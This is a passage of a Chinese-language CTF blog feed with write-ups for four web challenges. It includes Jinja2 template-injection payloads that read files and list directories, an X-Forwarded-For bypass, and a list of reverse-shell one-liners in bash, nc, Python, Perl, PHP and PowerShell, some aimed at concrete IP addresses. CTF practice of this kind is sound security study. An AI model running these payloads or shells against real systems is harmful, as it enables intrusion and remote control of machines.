    <content type="html"><![CDATA[<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>F12发现了</p><blockquote><p>/js/md5.js</p></blockquote><table><thead><tr><th>function enc(code){</th><th></th></tr></thead><tbody><tr><td></td><td>hash = hex_md5(code);</td></tr><tr><td></td><td>return hash;</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>function validate(){</td></tr><tr><td></td><td>var code = document.getElementById(“vcode”).value;</td></tr><tr><td></td><td>if (code != “”){</td></tr><tr><td></td><td>if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”){</td></tr><tr><td></td><td>alert(“您通过了验证！”);</td></tr><tr><td></td><td>window.location = “./flag.php”</td></tr><tr><td></td><td>}else{</td></tr><tr><td></td><td>alert(“你的授权码不正确！”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>}else{</td></tr><tr><td></td><td>alert(“请输入授权码”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td></td></tr><tr><td></td><td>}</td></tr></tbody></table><p>说输入code与某值进行比较，相等就出现flag。所以现在就是分析加密函数。</p><blockquote><p> if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”)</p></blockquote><blockquote><pre><code>function hex_md5(s)&#123; return binl2hex(core_md5(str2binl(s), s.length * 8));&#125;</code></pre></blockquote><p>可以看到hex_md5就是通过core_md5加密str2bin1加密后的code先去看看strbin函数</p><pre><code>function str2binl(str)&#123;  var bin = Array();  var mask = (1 &lt;&lt; 8) - 1;//mask=255  for(var i = 0; i &lt; str.length * 8; i += 8)    bin[i&gt;&gt;5] |= (str.charCodeAt(i / chrsz) &amp; mask) &lt;&lt; (i%32);  return bin;&#125;</code></pre><p>额，算了好麻烦。。。换个思路直接读取flag.php(强行狡辩，其实我忘记可以直接读取的了)</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200505180527740.png" alt="image-20200505180527740"></p><p>xff绕过。</p><p>flag{abd61860-ad51-41aa-8a19-6d7c43cbac68}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MRCTF2020-PYWebsite&quot;&gt;&lt;a href=&quot;#MRCTF2020-PYWebsite&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]PYWebsite&quot;&gt;&lt;/a&gt;[MRCTF2020]PYWebsite&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/03/[GYCTF2020]FlaskApp/"/>
    <id>http://yoursite.com/2020/05/03/[GYCTF2020]FlaskApp/</id>
    <published>2020-05-03T10:48:01.753Z</published>
    <updated>2020-05-03T10:48:01.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>在提示页面f12发现了一段神奇的cookie</p><blockquote><p>eyJjc3JmX3Rva2VuIjoiOTAzM2UwYTY2YzhhOTM3N2NjYmNlMTIwNDcyZmZkYWVhMTg3YTljNyJ9.Xq5hWQ.wd9G8fR8lwO4P_W-GS9Dxbp70kQ</p></blockquote><p>在网站的解密页面解密一下。突然就跳转到了一个神奇的页面</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200503171137795.png" alt="image-20200503171137795"></p><p>发现这是WSGI</p><p>在加密界面输入12，解密解密成功回显12</p><p>这里有个脚本</p><blockquote><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></blockquote><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200503183556194.png" alt="image-20200503183556194"></p><p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;</code></p><p>最后用切片操作读取flag</p><p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p><p>下面是一些链接：</p><p><a href="https://www.cnblogs.com/zaqzzz/p/10251892.html">https://www.cnblogs.com/zaqzzz/p/10251892.html</a></p><p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GYCTF2020-FlaskApp&quot;&gt;&lt;a href=&quot;#GYCTF2020-FlaskApp&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]FlaskApp&quot;&gt;&lt;/a&gt;[GYCTF2020]FlaskApp&lt;/h2&gt;&lt;p&gt;在提示页
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/02/[FBCTF2019]RCEService/"/>
    <id>http://yoursite.com/2020/05/02/[FBCTF2019]RCEService/</id>
    <published>2020-05-02T11:46:52.215Z</published>
    <updated>2020-05-02T11:46:52.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200502191258431.png" alt="image-20200502191258431"></p><p>当输入{“cmd”:”ls”}有回显，但是不能读取。</p><p>本来想拼接字符串的但是没有成功。</p><p><a href="https://xz.aliyun.com/t/5399">https://xz.aliyun.com/t/5399</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;FBCTF2019-RCEService&quot;&gt;&lt;a href=&quot;#FBCTF2019-RCEService&quot; class=&quot;headerlink&quot; title=&quot;[FBCTF2019]RCEService&quot;&gt;&lt;/a&gt;[FBCTF2019]RCEService&lt;/h2
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/05/02/[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]CHECKIN/"/>
    <id>http://yoursite.com/2020/05/02/[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]CHECKIN/</id>
    <published>2020-05-02T11:12:23.753Z</published>
    <updated>2020-05-02T11:12:23.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p>看到这题的时候并不会做。考点是反弹shell。</p><p>收集一点可能用上的反弹shell命令</p><p><strong><em>1\</em></strong>|<strong><em>0**</em></strong>bash**</p><pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre><p><strong><em>2\</em></strong>|<strong><em>0**</em></strong>nc**</p><pre><code>nc -e /bin/sh ip port</code></pre><p><strong><em>3\</em></strong>|<strong><em>0**</em></strong>python**</p><pre><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p><strong><em>4\</em></strong>|<strong><em>0**</em></strong>perl**</p><pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.224.117:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p><strong><em>5\</em></strong>|<strong><em>0**</em></strong>php**</p><pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p><strong><em>6\</em></strong>|<strong><em>0**</em></strong>PowerShell**</p><pre><code>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(&#39;$c=New-Object Net.Sockets.TCPClient(&quot;174.1.52.162&quot;,6666);$s=$c.GetStream();[byte[]]$bytes=0..65535|%&#123;0&#125;;while(($i=$s.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $d 2&gt;&amp;1 | Out-String );$sb2=$sb+&#39;&#39;PS &#39;&#39;+(pwd).Path+&#39;&#39;&gt; &#39;&#39;;$sb=([Text.Encoding]::Default).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()&#125;;$c.Close()&#39;))powershell -nop -enc &#123;reverse shell command&#125;</code></pre><p>参考：<a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p><p>连入后因为：</p><p>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</p><p>执行</p><p><code>python3 -c &quot;import os;[os.system(&#39;cat /proc/&#39;+str(i)+&#39;/fd/&#39;+str(j)) for i in range(20) for j in range(10)];&quot;</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;V-amp-N2020-公开赛-CHECKIN&quot;&gt;&lt;a href=&quot;#V-amp-N2020-公开赛-CHECKIN&quot; class=&quot;headerlink&quot; title=&quot;[V&amp;amp;N2020 公开赛]CHECKIN&quot;&gt;&lt;/a&gt;[V&amp;amp;N2020 公开赛
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
